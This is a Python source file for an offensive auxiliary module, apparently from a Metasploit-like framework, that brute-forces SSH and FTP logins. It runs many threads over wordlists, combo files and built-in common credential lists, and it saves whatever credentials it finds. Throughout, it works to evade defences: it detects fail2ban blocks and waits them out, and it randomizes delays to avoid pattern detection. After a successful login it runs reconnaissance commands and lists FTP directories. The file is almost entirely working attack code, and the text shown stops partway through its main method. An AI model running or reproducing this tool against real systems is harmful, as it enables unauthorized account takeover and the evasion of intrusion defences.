MODULE_TYPE = "auxiliary"

import ftplib
import threading
import socket
import time
import sys
import os
import queue
import random
from collections import OrderedDict
import paramiko  # For SSH
from paramiko.ssh_exception import AuthenticationException, SSHException, BadHostKeyException
import pyfiglet
from datetime import datetime

class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Complete Credential Brute Forcer',
            'Rank': 'Excellent',
            'Platform': 'Linux/Windows',
            'Description': 'Advanced multi-threaded SSH and FTP credential brute force tool with full timeout handling',
            'Note': 'For authorized testing only. Respect rate limits and terms of service.',
            'Author': 'KentScript',
            'Date Release': '2025-03-24',
            'Options': OrderedDict([
                ('RHOST', ('192.168.1.100', True, 'Target IP address or hostname')),
                ('RPORT', ('22', False, 'Target port (22=SSH, 21=FTP, or custom)')),
                ('SERVICE', ('ssh', True, 'Service type: ssh, ftp')),
                ('USERNAME', ('', False, 'Single username to test (or use USER_FILE)')),
                ('USER_FILE', ('', False, 'File containing usernames (one per line)')),
                ('PASSWORD', ('', False, 'Single password to test (or use PASS_FILE)')),
                ('PASS_FILE', ('/usr/share/wordlists/rockyou.txt', False, 'Password wordlist file')),
                ('COMBO_FILE', ('', False, 'File with username:password combos (overrides others)')),
                ('THREADS', ('10', False, 'Number of concurrent threads (1-50)')),
                ('TIMEOUT', ('5', False, 'Connection timeout in seconds')),
                ('SESSION_TIMEOUT', ('300', False, 'Maximum session time in seconds (0=no limit)')),
                ('KEEPALIVE_INTERVAL', ('60', False, 'SSH keepalive interval in seconds (0=disable)')),
                ('DELAY', ('0', False, 'Delay between attempts (seconds)')),
                ('RATE_LIMIT', ('0', False, 'Maximum attempts per minute (0=no limit)')),
                ('STOP_ON_SUCCESS', ('true', False, 'Stop after first successful login')),
                ('OUTPUT_FILE', ('found_creds.txt', False, 'File to save found credentials')),
                ('LOG_FILE', ('', False, 'Log all attempts to file')),
                ('VERBOSE', ('false', False, 'Show all attempts (true/false)')),
                ('MAX_RETRIES', ('2', False, 'Maximum connection retries on failure')),
                ('BANNER_GRAB', ('true', False, 'Attempt to grab service banner')),
                ('BLOCK_DETECTION', ('true', False, 'Detect and handle IP blocking')),
                ('BLOCK_WAIT', ('300', False, 'Maximum wait time when blocked (seconds)')),
                ('RANDOMIZE_DELAY', ('true', False, 'Add random variation to delays'))
            ])
        }
        
        self.found_credentials = []
        self.attempts = 0
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.running = True
        self.password_queue = queue.Queue()
        self.rate_limiter = None
        self.log_file_handle = None
        self.start_time = None
        self.block_retry_count = 0
        self.last_block_time = 0
        self.blocked_ips = {}
        self.current_target = ""
        
        # Common username lists - COMPLETE ORIGINAL
        self.common_usernames = [
            'root', 'admin', 'administrator', 'user', 'test', 'guest',
            'ubuntu', 'debian', 'centos', 'oracle', 'pi', 'raspberry',
            'ftp', 'ssh', 'mysql', 'postgres', 'oracle', 'tomcat',
            'www-data', 'apache', 'nginx', 'www', 'operator',
            'backup', 'sysadmin', 'support', 'student', 'teacher',
            'manager', 'service', 'demo', 'public', 'anonymous'
        ]
        
        # Common password lists - COMPLETE ORIGINAL
        self.common_passwords = [
            'admin', 'password', '123456', 'password123', 'admin123',
            'root', 'toor', 'test', 'guest', '12345', '123456789',
            'qwerty', 'letmein', 'welcome', 'monkey', 'dragon',
            'passw0rd', 'master', 'hello', 'freedom', 'whatever',
            'qazwsx', 'trustno1', '654321', 'jordan', 'harley',
            'ranger', 'iwantu', 'shadow', 'starwars', 'fuckyou'
        ]

    def parse_config_value(self, raw_value, value_type=str):
        """
        Parse configuration values, removing comments and converting to appropriate type
        """
        if raw_value is None:
            if value_type == int:
                return 0
            elif value_type == float:
                return 0.0
            elif value_type == bool:
                return False
            else:
                return ""
        
        # Convert to string and clean
        value_str = str(raw_value).strip()
        
        # Remove comments (everything after # or //)
        if '#' in value_str:
            value_str = value_str.split('#')[0].strip()
        if '//' in value_str:
            value_str = value_str.split('//')[0].strip()
        
        # Handle empty strings
        if not value_str:
            if value_type == int:
                return 0
            elif value_type == float:
                return 0.0
            elif value_type == bool:
                return False
            else:
                return ""
        
        # Handle boolean strings
        if value_type == bool:
            if isinstance(value_str, str):
                return value_str.lower() in ['true', 'yes', '1', 't', 'y', 'on']
            return bool(value_str)
        
        # Convert to requested type
        try:
            if value_type == int:
                return int(float(value_str)) if '.' in value_str else int(value_str)
            elif value_type == float:
                return float(value_str)
            elif value_type == str:
                return value_str
            else:
                return value_type(value_str)
        except (ValueError, TypeError) as e:
            # Return default based on type
            if value_type == int:
                return 0
            elif value_type == float:
                return 0.0
            elif value_type == bool:
                return False
            else:
                return ""

    def logo(self):
        """Display module banner"""
        title = 'Credential Bruter'
        if pyfiglet:
            ascii_text = pyfiglet.figlet_format(title, font="slant")
            print(f"\033[91m{ascii_text}\033[0m")
        else:
            print(f"[=== {title} ===]")
        print(f"\033[93mComplete with Timeout & Block Handling\033[0m\n")

    def help(self):
        """Display detailed help information - ORIGINAL STYLE"""
        help_text = """
Complete Credential Brute Force Module
======================================

This module performs multi-threaded brute force attacks against:
- SSH (Secure Shell) services with full timeout handling
- FTP (File Transfer Protocol) services

Features:
--------
1. SSH Keepalive Support
2. Session Timeout Management  
3. Rate Limiting
4. Connection Retries
5. Enhanced Logging
6. Banner Grabbing
7. Block Detection (fail2ban)
8. Randomized Delays
9. Combo File Support
10. Wordlist Loading
11. Common Credentials

Usage Modes:
-----------
1. Single username + password list
   set USERNAME admin
   set PASS_FILE passwords.txt
   run

2. Username list + single password
   set USER_FILE users.txt
   set PASSWORD Password123
   run

3. Username list + password list
   set USER_FILE users.txt
   set PASS_FILE passwords.txt
   run

4. Combo file (username:password format) - HIGHEST PRIORITY
   set COMBO_FILE combos.txt
   run

5. Quick test with common credentials
   set RHOST 192.168.1.100
   set SERVICE ssh
   run

Example Commands:
---------------
# SSH brute force
set RHOST 192.168.1.100
set SERVICE ssh
set COMBO_FILE combos.txt
set THREADS 5
set TIMEOUT 5
run

# FTP brute force  
set RHOST ftp.example.com
set SERVICE ftp
set USERNAME anonymous
set PASS_FILE passwords.txt
run
        """
        print(help_text)

    def setup_rate_limiter(self, rate_limit):
        """Setup rate limiting if enabled"""
        if rate_limit > 0:
            self.rate_limiter = {
                'limit': rate_limit,
                'window': 60,  # 60 seconds
                'attempts': 0,
                'window_start': time.time(),
                'lock': threading.Lock()
            }
    
    def check_rate_limit(self):
        """Check and enforce rate limiting"""
        if not self.rate_limiter:
            return True
        
        with self.rate_limiter['lock']:
            current_time = time.time()
            
            # Reset window if expired
            if current_time - self.rate_limiter['window_start'] >= self.rate_limiter['window']:
                self.rate_limiter['attempts'] = 0
                self.rate_limiter['window_start'] = current_time
            
            # Check if limit reached
            if self.rate_limiter['attempts'] >= self.rate_limiter['limit']:
                # Calculate wait time
                wait_time = self.rate_limiter['window'] - (current_time - self.rate_limiter['window_start'])
                if wait_time > 0:
                    if self.verbose:
                        print(f"[*] Rate limit reached. Waiting {wait_time:.1f} seconds...")
                    time.sleep(wait_time)
                    # Reset after wait
                    self.rate_limiter['attempts'] = 0
                    self.rate_limiter['window_start'] = time.time()
            
            self.rate_limiter['attempts'] += 1
            return True

    def log_message(self, message, level="INFO"):
        """Log message to file if logging enabled"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        if self.log_file_handle:
            self.log_file_handle.write(log_entry)
            self.log_file_handle.flush()
        
        if level == "ERROR" or (level == "DEBUG" and self.verbose):
            print(f"[{level}] {message}")

    def is_ip_blocked(self, host, port, timeout=5):
        """Check if our IP is temporarily blocked by the server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                return False, "Not blocked"
            elif result == 111:
                return True, f"Connection refused (error {result}) - likely blocked by fail2ban"
            elif result == 110:
                return True, f"Connection timeout (error {result}) - might be blocked"
            else:
                return True, f"Connection error {result} - possible block"
                
        except socket.timeout:
            return True, "Connection timeout - possible block"
        except Exception as e:
            return True, f"Socket error: {e}"

    def handle_block_recovery(self, host, port, timeout=5):
        """Handle IP blocking with exponential backoff"""
        if not self.block_detection:
            return False
        
        current_time = time.time()
        
        # Check if we're in a blocked state
        is_blocked, reason = self.is_ip_blocked(host, port, timeout)
        
        if is_blocked:
            self.log_message(f"IP blocked detected: {reason}", "WARNING")
            
            # Calculate wait time with exponential backoff
            wait_time = min(self.block_wait, 60 * (2 ** self.block_retry_count))
            self.log_message(f"Waiting {wait_time}s before retry (attempt {self.block_retry_count + 1})", "INFO")
            
            # Wait with progress indicator
            for i in range(int(wait_time)):
                if not self.running:
                    return True
                if i % 10 == 0:
                    print(f"\r[*] Block recovery: {i}/{int(wait_time)} seconds", end='', flush=True)
                time.sleep(1)
            print()
            
            self.block_retry_count += 1
            
            # Check again after wait
            is_blocked, reason = self.is_ip_blocked(host, port, timeout)
            if is_blocked:
                self.log_message(f"Still blocked after wait: {reason}", "WARNING")
                return True
            else:
                self.log_message("Block recovered, resuming attack", "INFO")
                self.block_retry_count = 0
                return False
        
        # Reset block counter if not blocked
        self.block_retry_count = 0
        return False

    def check_service(self, host, port, timeout=5, grab_banner=True):
        """Check if service is running on specified port with banner grabbing"""
        try:
            # First check if we're blocked
            if self.block_detection:
                is_blocked, reason = self.is_ip_blocked(host, port, timeout)
                if is_blocked:
                    return False, f"IP appears blocked: {reason}"
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            
            if result == 0:
                banner = ""
                if grab_banner and self.banner_grab:
                    try:
                        if port == 22 or port == 2222:  # SSH
                            # SSH servers send banner immediately
                            sock.settimeout(2)
                            banner_data = sock.recv(1024)
                            banner = f"SSH: {banner_data.decode('utf-8', errors='ignore').strip()[:100]}"
                        elif port == 21:  # FTP
                            sock.settimeout(2)
                            banner_data = sock.recv(1024)
                            banner = f"FTP: {banner_data.decode('utf-8', errors='ignore').strip()[:100]}"
                        else:
                            banner = f"Service on port {port}"
                    except socket.timeout:
                        banner = f"Service running (no banner received)"
                    except Exception as e:
                        banner = f"Service running (banner error: {str(e)[:50]})"
                else:
                    banner = f"Service running on port {port}"
                
                sock.close()
                return True, banner
            else:
                sock.close()
                return False, f"Connection refused (error {result})"
                
        except socket.timeout:
            return False, "Connection timeout"
        except socket.error as e:
            return False, f"Socket error: {e}"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"

    def load_wordlist(self, filename, max_lines=1000000):
        """Load lines from a wordlist file - ORIGINAL COMPLETE"""
        words = []
        
        if not os.path.exists(filename):
            raise FileNotFoundError(f"File not found: {filename}")
        
        try:
            file_size = os.path.getsize(filename)
            print(f"[*] Loading {filename} ({file_size:,} bytes)")
            self.log_message(f"Loading wordlist: {filename} ({file_size:,} bytes)")
            
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                lines_loaded = 0
                for line in f:
                    word = line.strip()
                    if word and not word.startswith('#'):
                        words.append(word)
                        lines_loaded += 1
                        
                        if lines_loaded >= max_lines:
                            print(f"[!] Limiting to first {max_lines:,} entries")
                            self.log_message(f"Wordlist limited to {max_lines:,} entries", "WARNING")
                            break
                
                print(f"[+] Loaded {len(words):,} entries")
                self.log_message(f"Wordlist loaded: {len(words):,} entries", "INFO")
                return words
                
        except MemoryError:
            error_msg = f"File too large! Try a smaller wordlist"
            print(f"[-] {error_msg}")
            self.log_message(error_msg, "ERROR")
            return []
        except Exception as e:
            error_msg = f"Error loading {filename}: {e}"
            print(f"[-] {error_msg}")
            self.log_message(error_msg, "ERROR")
            return []

    def load_combo_file(self, filename):
        """Load username:password combinations from file - ORIGINAL COMPLETE"""
        combos = []
        
        if not os.path.exists(filename):
            raise FileNotFoundError(f"Combo file not found: {filename}")
        
        try:
            print(f"[*] Loading combo file: {filename}")
            self.log_message(f"Loading combo file: {filename}", "INFO")
            
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            parts = line.split(':', 1)
                            if len(parts) == 2:
                                combos.append((parts[0].strip(), parts[1].strip()))
                        elif ';' in line:
                            parts = line.split(';', 1)
                            if len(parts) == 2:
                                combos.append((parts[0].strip(), parts[1].strip()))
            
            print(f"[+] Loaded {len(combos)} combinations")
            self.log_message(f"Combo file loaded: {len(combos)} combinations", "INFO")
            return combos
            
        except Exception as e:
            error_msg = f"Error loading combo file: {e}"
            print(f"[-] {error_msg}")
            self.log_message(error_msg, "ERROR")
            return []

    def generate_credentials(self, config):
        """Generate credential pairs based on configuration - ORIGINAL COMPLETE"""
        credentials = []
        
        # Method 1: Combo file (highest priority)
        if config['combo_file']:
            return self.load_combo_file(config['combo_file'])
        
        # Method 2: Single username + password list
        if config['username'] and config['pass_file']:
            passwords = self.load_wordlist(config['pass_file'])
            for password in passwords:
                credentials.append((config['username'], password))
            return credentials
        
        # Method 3: Username list + single password
        if config['user_file'] and config['password']:
            usernames = self.load_wordlist(config['user_file'])
            for username in usernames:
                credentials.append((username, config['password']))
            return credentials
        
        # Method 4: Username list + password list
        if config['user_file'] and config['pass_file']:
            usernames = self.load_wordlist(config['user_file'], max_lines=500)
            passwords = self.load_wordlist(config['pass_file'], max_lines=500)
            
            # Limit combinations to prevent explosion
            max_combinations = 100000
            count = 0
            
            for username in usernames:
                for password in passwords:
                    credentials.append((username, password))
                    count += 1
                    if count >= max_combinations:
                        print(f"[!] Limited to {max_combinations} combinations")
                        self.log_message(f"Limited combinations to {max_combinations}", "WARNING")
                        return credentials
            return credentials
        
        # Method 5: Use common lists (default)
        print("[*] Using built-in common credentials")
        self.log_message("Using built-in common credentials", "INFO")
        
        for username in self.common_usernames:
            for password in self.common_passwords:
                credentials.append((username, password))
        
        return credentials

    def randomized_delay(self, base_delay, variation=0.3):
        """Add random variation to delays to avoid pattern detection"""
        if not self.randomize_delay or base_delay <= 0:
            return base_delay
        
        variation_amount = base_delay * variation
        random_variation = random.uniform(-variation_amount, variation_amount)
        actual_delay = max(0.1, base_delay + random_variation)
        
        if self.verbose and base_delay > 0:
            print(f"[DEBUG] Randomized delay: {base_delay:.2f}s -> {actual_delay:.2f}s")
        
        return actual_delay

    def ssh_bruteforce(self, host, port, username, password, timeout=5, 
                       session_timeout=300, keepalive_interval=60, max_retries=2):
        """Attempt SSH login using paramiko with enhanced timeout handling - COMPLETE"""
        attempt_start = time.time()
        
        with self.lock:
            self.attempts += 1
        
        # Check for IP blocking
        if self.block_detection and self.handle_block_recovery(host, port, timeout):
            return False
        
        # Apply rate limiting
        if not self.check_rate_limit():
            self.log_message(f"Rate limited for {username}", "DEBUG")
            return False
        
        if self.verbose:
            print(f"[*] Trying SSH: {username}:{password}")
        self.log_message(f"Attempting SSH: {host}:{port} - {username}:{password}", "DEBUG")
        
        for retry in range(max_retries + 1):
            if not self.running:
                return False
            
            # Check session timeout
            if session_timeout > 0 and (time.time() - attempt_start) > session_timeout:
                self.log_message(f"Session timeout for {username}", "DEBUG")
                return False
            
            try:
                # Create SSH client with enhanced timeout handling
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Set connection parameters with backoff for retries
                current_timeout = timeout * (retry + 1)  # Increase timeout on retry
                
                ssh.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    password=password,
                    timeout=current_timeout,
                    banner_timeout=current_timeout,
                    auth_timeout=current_timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                # Enable keepalive if configured
                transport = ssh.get_transport()
                if transport and keepalive_interval > 0:
                    transport.set_keepalive(keepalive_interval)
                    self.log_message(f"Keepalive enabled ({keepalive_interval}s) for {username}", "DEBUG")
                
                # Verify connection is actually working
                if not transport or not transport.is_active():
                    ssh.close()
                    raise SSHException("Connection not active after authentication")
                
                # Success - we're connected
                with self.lock:
                    self.success_count += 1
                    self.found_credentials.append({
                        'service': 'SSH',
                        'host': host,
                        'port': port,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'session_duration': time.time() - attempt_start
                    })
                
                success_msg = f"SSH SUCCESS: {username}:{password}"
                print(f"\n\033[92m[+] {success_msg}\033[0m")
                self.log_message(success_msg, "SUCCESS")
                
                # Try to get system information (with timeout)
                try:
                    # Check if session is still within limits
                    remaining_time = session_timeout - (time.time() - attempt_start)
                    exec_timeout = min(5, remaining_time) if session_timeout > 0 else 5
                    
                    if exec_timeout > 0:
                        stdin, stdout, stderr = ssh.exec_command('uname -a', timeout=exec_timeout)
                        system_info = stdout.read().decode('utf-8', errors='ignore').strip()
                        if system_info:
                            print(f"[+] System info: {system_info}")
                            self.log_message(f"System info: {system_info}", "INFO")
                        
                        stdin, stdout, stderr = ssh.exec_command('id', timeout=exec_timeout)
                        user_info = stdout.read().decode('utf-8', errors='ignore').strip()
                        if user_info:
                            print(f"[+] User info: {user_info}")
                            self.log_message(f"User info: {user_info}", "INFO")
                except socket.timeout:
                    self.log_message(f"Command timeout for {username}", "WARNING")
                except Exception as e:
                    self.log_message(f"Command error for {username}: {str(e)[:50]}", "DEBUG")
                
                ssh.close()
                return True
                
            except AuthenticationException:
                # Authentication failed, no need to retry
                if retry == 0:  # Only log on first attempt
                    self.log_message(f"Authentication failed: {username}", "DEBUG")
                return False
                
            except socket.timeout:
                self.log_message(f"Connection timeout for {username} (attempt {retry+1}/{max_retries+1})", "DEBUG")
                if retry < max_retries:
                    time.sleep(1)  # Wait before retry
                    continue
                return False
                
            except socket.error as e:
                error_code = e.errno if hasattr(e, 'errno') else 'unknown'
                self.log_message(f"Socket error {error_code} for {username}: {str(e)[:50]} (attempt {retry+1}/{max_retries+1})", "DEBUG")
                
                # Check if this is a connection refused (might be block)
                if error_code == 111 and self.block_detection:
                    self.block_retry_count += 1
                    return False
                
                if retry < max_retries:
                    time.sleep(1)
                    continue
                return False
                
            except EOFError:
                self.log_message(f"Connection closed by server for {username} (attempt {retry+1}/{max_retries+1})", "DEBUG")
                if retry < max_retries:
                    time.sleep(1)
                    continue
                return False
                
            except SSHException as e:
                error_msg = str(e)
                if "Error reading SSH protocol banner" in error_msg or "timed out" in error_msg:
                    self.log_message(f"SSH protocol error for {username}: {error_msg[:50]} (attempt {retry+1}/{max_retries+1})", "DEBUG")
                    if retry < max_retries:
                        time.sleep(1)
                        continue
                else:
                    self.log_message(f"SSH error for {username}: {error_msg[:50]}", "DEBUG")
                return False
                
            except Exception as e:
                self.log_message(f"Unexpected error for {username}: {str(e)[:50]} (attempt {retry+1}/{max_retries+1})", "DEBUG")
                if retry < max_retries:
                    time.sleep(1)
                    continue
                return False
        
        return False

    def ftp_bruteforce(self, host, port, username, password, timeout=5, max_retries=2):
     """Attempt FTP login with enhanced error handling - WITH DEBUGGING"""
     attempt_start = time.time()
    
     with self.lock:
        self.attempts += 1
    
    # Check for IP blocking
     if self.block_detection and self.handle_block_recovery(host, port, timeout):
        return False
    
    # Apply rate limiting
     if not self.check_rate_limit():
        self.log_message(f"Rate limited for {username}", "DEBUG")
        return False
    
     if self.verbose:
        print(f"[*] Trying FTP: {username}:{password}")
     self.log_message(f"Attempting FTP: {host}:{port} - {username}:{password}", "DEBUG")
    
     for retry in range(max_retries + 1):
        if not self.running:
            return False
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout * (retry + 1))
            ftp.login(username, password)
            
            # Success - verify we can do something
            try:
                ftp.voidcmd("NOOP")  # Send NOOP command to verify connection
            except:
                ftp.quit()
                raise ftplib.error_perm("Connection verification failed")
            
            with self.lock:
                self.success_count += 1
                self.found_credentials.append({
                    'service': 'FTP',
                    'host': host,
                    'port': port,
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'session_duration': time.time() - attempt_start
                })
            
            success_msg = f"FTP SUCCESS: {username}:{password}"
            print(f"\n\033[92m[+] {success_msg}\033[0m")
            self.log_message(success_msg, "SUCCESS")
            
            # ============================================
            # FIXED DIRECTORY LISTING WITH BETTER DEBUGGING
            # ============================================
            try:
                # Try to get current directory first
                current_dir = ftp.pwd()
                print(f"[+] Current FTP directory: {current_dir}")
                
                # Try to list directory contents
                print("[*] Attempting to list directory contents...")
                
                # Method 1: Try using LIST command
                files = []
                try:
                    ftp.retrlines('LIST', files.append)
                    if files:
                        print(f"[+] FTP directory listing ({len(files)} items):")
                        for i, file in enumerate(files[:5]):  # Show first 5
                            print(f"    {i+1}. {file[:100]}")
                        if len(files) > 5:
                            print(f"    ... and {len(files) - 5} more items")
                    else:
                        print("[+] Directory appears to be empty")
                except Exception as e:
                    print(f"[-] LIST command failed: {e}")
                    
                    # Method 2: Try using dir() method
                    try:
                        files = []
                        ftp.dir(files.append)
                        if files:
                            print(f"[+] FTP directory listing via dir() ({len(files)} items):")
                            for i, file in enumerate(files[:5]):
                                print(f"    {i+1}. {file[:100]}")
                    except Exception as e2:
                        print(f"[-] dir() method also failed: {e2}")
                        
                        # Method 3: Try NLST (names only)
                        try:
                            file_names = ftp.nlst()
                            if file_names:
                                print(f"[+] Files in directory ({len(file_names)}):")
                                for name in file_names[:10]:
                                    print(f"    - {name}")
                            else:
                                print("[+] Directory is empty (NLST returned empty list)")
                        except Exception as e3:
                            print(f"[-] NLST also failed: {e3}")
                            print("[!] Cannot list directory - server may have restrictions")
                
                # Try to get some file if possible
                try:
                    # Try to get file size of first file if exists
                    if 'files' in locals() and files:
                        # Extract first filename that looks like a file (not directory)
                        for line in files[:3]:
                            if line and len(line) > 0:
                                # Simple parsing - in real FTP LIST, files start with '-'
                                if line[0] == '-':
                                    parts = line.split()
                                    if len(parts) >= 9:
                                        filename = parts[-1]
                                        try:
                                            size = ftp.size(filename)
                                            print(f"[+] File '{filename}' size: {size} bytes")
                                        except:
                                            pass
                                        break
                except:
                    pass
                    
            except Exception as e:
                print(f"[-] Directory listing error: {e}")
                if self.verbose:
                    import traceback
                    print(f"[DEBUG] Traceback: {traceback.format_exc()[:200]}")
            # ============================================
            
            ftp.quit()
            return True
            
        except ftplib.error_perm as e:
            error_str = str(e)
            if "530" in error_str:  # Login incorrect
                return False
            elif "421" in error_str:  # Service not available
                self.log_message(f"FTP service unavailable for {username}: {error_str[:50]}", "DEBUG")
                if retry < max_retries:
                    time.sleep(1)
                    continue
            return False
            
        except socket.timeout:
            self.log_message(f"FTP timeout for {username} (attempt {retry+1}/{max_retries+1})", "DEBUG")
            if retry < max_retries:
                time.sleep(1)
                continue
            return False
            
        except socket.error as e:
            error_code = e.errno if hasattr(e, 'errno') else 'unknown'
            self.log_message(f"FTP socket error {error_code} for {username}: {str(e)[:50]} (attempt {retry+1}/{max_retries+1})", "DEBUG")
            
            # Check if connection refused (might be block)
            if error_code == 111 and self.block_detection:
                self.block_retry_count += 1
                return False
            
            if retry < max_retries:
                time.sleep(1)
                continue
            return False
            
        except Exception as e:
            self.log_message(f"FTP error for {username}: {str(e)[:50]} (attempt {retry+1}/{max_retries+1})", "DEBUG")
            if retry < max_retries:
                time.sleep(1)
                continue
            return False
    
     return False

    def worker_thread(self, host, port, service, credentials, config):
        """Worker thread function for brute forcing with enhanced configuration"""
        delay = config.get('delay', 0)
        stop_on_success = config.get('stop_on_success', True)
        session_timeout = config.get('session_timeout', 300)
        keepalive_interval = config.get('keepalive_interval', 60)
        max_retries = config.get('max_retries', 2)
        
        for username, password in credentials:
            if not self.running:
                break
            
            # Check if we should stop after success
            if stop_on_success and self.success_count > 0:
                break
            
            # Try the credentials
            success = False
            if service == 'ssh':
                success = self.ssh_bruteforce(
                    host, port, username, password, 
                    timeout=config.get('timeout', 5),
                    session_timeout=session_timeout,
                    keepalive_interval=keepalive_interval,
                    max_retries=max_retries
                )
            elif service == 'ftp':
                success = self.ftp_bruteforce(
                    host, port, username, password,
                    timeout=config.get('timeout', 5),
                    max_retries=max_retries
                )
            
            # Delay between attempts if specified
            if delay > 0:
                actual_delay = self.randomized_delay(delay)
                time.sleep(actual_delay)
            
            # If successful and stop_on_success is true, signal other threads
            if success and stop_on_success:
                with self.lock:
                    self.running = False
                break

    def save_results(self, filename):
        """Save found credentials to file"""
        if not self.found_credentials:
            return False
        
        try:
            with open(filename, 'w') as f:
                f.write("# Found Credentials - Complete Brute Force Module\n")
                f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Target: {self.current_target}\n")
                f.write("#" * 60 + "\n\n")
                
                for cred in self.found_credentials:
                    f.write(f"Service: {cred['service']}\n")
                    f.write(f"Host: {cred['host']}:{cred['port']}\n")
                    f.write(f"Username: {cred['username']}\n")
                    f.write(f"Password: {cred['password']}\n")
                    f.write(f"Time: {cred['timestamp']}\n")
                    if 'session_duration' in cred:
                        f.write(f"Session Duration: {cred['session_duration']:.2f}s\n")
                    f.write("-" * 40 + "\n")
            
            print(f"[+] Results saved to: {os.path.abspath(filename)}")
            self.log_message(f"Results saved to: {filename}", "INFO")
            return True
            
        except Exception as e:
            error_msg = f"Could not save results: {e}"
            print(f"[-] {error_msg}")
            self.log_message(error_msg, "ERROR")
            return False

    def execute(self, config_overrides=None):
        """Main execution method with enhanced timeout handling"""
        # Update configuration
        if config_overrides:
            for key, value in config_overrides.items():
                if key in self.info['Options']:
                    self.info['Options'][key] = (value, self.info['Options'][key][1], self.info['Options'][key][2])
        
        # Parse configuration WITH comment cleaning
        target = self.parse_config_value(self.info['Options']['RHOST'][0], str)
        port = self.parse_config_value(self.info['Options']['RPORT'][0], int)
        service = self.parse_config_value(self.info['Options']['SERVICE'][0], str).lower()
        username = self.parse_config_value(self.info['Options']['USERNAME'][0], str)
        user_file = self.parse_config_value(self.info['Options']['USER_FILE'][0], str)
        password = self.parse_config_value(self.info['Options']['PASSWORD'][0], str)
        pass_file = self.parse_config_value(self.info['Options']['PASS_FILE'][0], str)
        combo_file = self.parse_config_value(self.info['Options']['COMBO_FILE'][0], str)
        threads = self.parse_config_value(self.info['Options']['THREADS'][0], int)
        timeout = self.parse_config_value(self.info['Options']['TIMEOUT'][0], int)
        session_timeout = self.parse_config_value(self.info['Options']['SESSION_TIMEOUT'][0], int)
        keepalive_interval = self.parse_config_value(self.info['Options']['KEEPALIVE_INTERVAL'][0], int)
        delay = self.parse_config_value(self.info['Options']['DELAY'][0], float)
        rate_limit = self.parse_config_value(self.info['Options']['RATE_LIMIT'][0], int)
        stop_on_success = self.parse_config_value(self.info['Options']['STOP_ON_SUCCESS'][0], bool)
        output_file = self.parse_config_value(self.info['Options']['OUTPUT_FILE'][0], str)
        log_file = self.parse_config_value(self.info['Options']['LOG_FILE'][0], str)
        verbose = self.parse_config_value(self.info['Options']['VERBOSE'][0], bool)
        max_retries = self.parse_config_value(self.info['Options']['MAX_RETRIES'][0], int)
        banner_grab = self.parse_config_value(self.info['Options']['BANNER_GRAB'][0], bool)
        block_detection = self.parse_config_value(self.info['Options']['BLOCK_DETECTION'][0], bool)
        block_wait = self.parse_config_value(self.info['Options']['BLOCK_WAIT'][0], int)
        randomize_delay = self.parse_config_value(self.info['Options']['RANDOMIZE_DELAY'][0], bool)
        
        # Store configuration in instance variables
        self.verbose = verbose
        self.banner_grab = banner_grab
        self.block_detection = block_detection
        self.block_wait = block_wait
        self.randomize_delay = randomize_delay
        self.current_target = f"{target}:{port}"
        
        # Setup logging
        if log_file:
            try:
                self.log_file_handle = open(log_file, 'a', encoding='utf-8')
                self.log_message(f"Session started for {target}:{port} ({service})", "INFO")
            except Exception as e:
                print(f"[-] Could not open log file: {e}")
                self.log_file_handle = None
        
        # Setup rate limiting
        self.setup_rate_limiter(rate_limit)
        
        # Show banner
        self.logo()
        
        # Validate inputs
        if not target:
            error_msg = 'RHOST must be set. Use: set RHOST <target>'
            self.log_message(error_msg, "ERROR")
            return {
                'status': 'error',
                'message': error_msg
            }
        
        if service not in ['ssh', 'ftp']:
            error_msg = f"Invalid service: {service}. Use 'ssh' or 'ftp'"
            self.log_message(error_msg, "ERROR")
            return {
                'status': 'error',
                'message': error_msg
            }
        
        # Set default port if not specified
        if port == 22 and service == 'ftp':
            port = 21
        elif port == 21 and service == 'ssh':
            port = 22
        
        # Check service availability with block detection
        print(f"[*] Checking {service.upper()} service on {target}:{port}...")
        self.log_message(f"Checking service: {target}:{port} ({service})", "INFO")
        
        is_up, banner = self.check_service(target, port, timeout)
        
        if not is_up:
            error_msg = f"{service.upper()} service not responding on {target}:{port}"
            if "IP appears blocked" in banner:
                error_msg = f"{banner}"
            
            self.log_message(error_msg, "ERROR")
            return {
                'status': 'error',
                'message': error_msg
            }
        
        print(f"[+] Service detected: {banner}")
        self.log_message(f"Service detected: {banner}", "INFO")
        
        # Generate credentials to try
        config = {
            'username': username,
            'user_file': user_file,
            'password': password,
            'pass_file': pass_file,
            'combo_file': combo_file
        }
        
        credentials = self.generate_credentials(config)
        
        if not credentials:
            error_msg = 'No credentials generated. Check your configuration.'
            self.log_message(error_msg, "ERROR")
            return {
                'status': 'error',
                'message': error_msg
            }
        
        print(f"[*] Generated {len(credentials)} credential pairs")
        
        # Display attack configuration
        print(f"\n[+] Attack Configuration:")
        print(f"    Target: {target}:{port}")
        print(f"    Service: {service.upper()}")
        print(f"    Threads: {threads}")
        print(f"    Timeout: {timeout}s")
        print(f"    Session Timeout: {session_timeout}s")
        print(f"    Keepalive Interval: {keepalive_interval}s")
        print(f"    Max Retries: {max_retries}")
        print(f"    Delay: {delay}s")
        print(f"    Rate Limit: {rate_limit}/min")
        print(f"    Block Detection: {block_detection}")
        print(f"    Randomize Delay: {randomize_delay}")
        print(f"    Stop on success: {stop_on_success}")
